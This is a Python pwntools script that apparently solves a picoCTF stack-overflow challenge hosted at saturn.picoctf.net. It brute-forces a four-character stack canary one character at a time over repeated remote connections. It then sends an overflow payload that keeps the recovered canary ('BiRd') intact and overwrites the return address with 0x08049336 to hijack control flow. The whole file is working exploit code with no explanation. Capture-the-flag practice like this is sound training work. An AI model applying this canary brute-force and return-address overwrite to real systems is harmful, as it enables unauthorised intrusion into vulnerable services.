# coding: utf-8
import time
from pwn import *
def fun(port=0):
    test = ""
    k=0
    alpha = string.ascii_letters+"0123456789"
    for i in range(4):
      for j in range(len(alpha)):      
          try:  
            p = remote("saturn.picoctf.net", port)
            #p=process("./vuln")
            time.sleep(0.01)
            resp = p.recv()
            print(resp)
            val = 65+k
            val2 = str(val).encode('utf-8')
            p.sendline(val2)
            print(p.recv())
            payload = b"0"*64+test.encode("utf-8")+alpha[j].encode('utf-8')
            print(payload)
            p.sendline(payload)
            #print(p.recv())
            note = p.recv()
            print(note)
            #p.kill()
            p.close()
            if b"*****" not in note:
                test+=alpha[j]
                k+=1
                print(test)
                break
          except:
              j=j-1
    runit(test,port)          
def runit(test,port=0):        
    if port==0:
        p=process("./vuln")
    else:
        p = remote("saturn.picoctf.net", port)
    payload = b"a"*64+test.encode("utf-8")+b'a'*16+p32(0x08049336)
    print(p.recv())
    p.sendline(b"152")
    print(p.recv())
    p.sendline(payload)
    print(p.recv())
    if port!=0:
        print(p.recv())
    p.close()
#fun(58297)
runit("BiRd",58297)
runit("aaaz",0)
